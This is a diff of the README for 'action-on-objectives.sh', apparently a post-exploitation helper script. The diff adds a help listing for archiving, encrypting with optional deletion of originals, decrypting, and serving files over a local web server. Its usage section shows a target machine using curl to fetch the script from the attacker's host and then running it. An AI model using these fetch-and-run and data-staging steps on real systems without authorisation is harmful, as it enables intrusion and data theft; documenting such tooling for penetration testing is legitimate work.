@@ -6,10 +6,10 @@ This script serves as a tool for some specified actions like encrypt files or di
 
 ## Features
 
-- Create a compressed tar archive from given files or directories
-- Unarchive given tar archive
-- Encrypt given files or directories
-
+- Create a compressed tar archive of files or directories
+- Unarchive compressed tar archive
+- Encrypt files or directories
+- Decrypt encrypted .gpg file
 
 ## Usage
 
@@ -23,14 +23,32 @@ Local network:
 # Host
 sh action-on-objectives.sh -w
 # Target
-curl -LJO <Host>:8000/
+curl -LJO <Host>:8000/action-on-objectives.sh
 sh action-on-objectives.sh -h
 ```
 
 ### Parameters
 
+```
+sh action-on-objectives.sh -h
 
+Usage: action-on-objectives.sh [options]
 
+Options:
+-h                    Show this help message
+-a <file, directory>  Archive and compress given files or directory
+                      Specify directories without the last /
+-u <file.tar.gz>      Extract the given tar archive
+-e <file, directory>  Encrypt given file or directory (symmetric encryption with password)
+-d <file.gpg>         Decrypt given file
+-r                    Remove the original files
+
+-w                    Serves a local web server for transferring files
+
+Output:
+-c                    No colours. Without colours, the output can probably be read better
+-q                    Quiet. No banner and no advisory displayed
+```
 
 ## Results
 
@@ -43,4 +61,3 @@ The script uses /bin/sh syntax and is fully POSIX compatible so can run on most 
 -----
 
 ## Additional Information
-
